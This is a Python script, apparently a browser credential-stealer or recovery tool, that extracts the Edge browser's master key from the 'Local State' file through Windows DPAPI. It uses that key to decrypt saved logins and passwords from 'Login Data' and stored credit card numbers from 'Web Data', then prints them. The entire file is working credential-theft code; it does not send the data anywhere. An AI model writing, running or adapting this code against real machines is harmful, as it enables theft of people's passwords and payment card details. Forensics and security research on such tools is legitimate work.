import json
import base64
import win32crypt
import sqlite3
from Crypto.Cipher import AES

# Decrypt the password
def dec_win_pwd(p: bytes, k: bytes) -> str:
        try:
            iv = p[3:15]
            p = p[15:]
            cipher = AES.new(k, AES.MODE_GCM, iv)
            return cipher.decrypt(p)[:-16].decode()
        except Exception:
            try:
                return str(win32crypt.CryptUnprotectData(p, None, None, None, 0)[1])
            except Exception:
                return ""

# Fetch key for Edge browser from "Local State" file
def get_key_from_localstate(path: str):
    with open(path, "r", encoding="utf-8") as file:
        local_state = file.read()
        local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]      
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

# Read "Login Data" database and use "Local State" key to decrypt credentials
def query_login_database(path: str) -> list:
    vs = []
    db = sqlite3.connect(path)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, " +
                   "date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        pw = dec_win_pwd(row[3], key)
        vs.append(
            dict(
                origin_url=row[0],
                action_url=row[1],
                username=row[2],
                password=pw,
                creation_time=row[4],
                last_time_used=row[5],
            ))
        
    cursor.close()
    db.close()
    return vs

# Read "Web Data" database and use "Local State" key to decrypt credit card numbers
def query_web_database(path: str) -> list:
    webs = []
    db = sqlite3.connect(path)
    cursor = db.cursor()
    cursor.execute("SELECT name_on_card, expiration_month, expiration_year, " +
                   "card_number_encrypted, date_modified FROM credit_cards")
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue
        card_number = dec_win_pwd(row[3], key)
        webs.append(
            dict(
                name_on_card=row[0],
                expiration_month=row[1],
                expiration_year=row[2],
                card_number=card_number,
                date_modified=row[4],
            )
        )
        
    cursor.close()
    db.close()
    return webs

# Fetch decrypted credentials
key = get_key_from_localstate(path='Local State')  
creds_login = query_login_database(path='Login Data')
creds_web = query_web_database(path='Web Data')

for cred in creds_login:
    print(cred)
for cred in creds_web:
    print(cred)
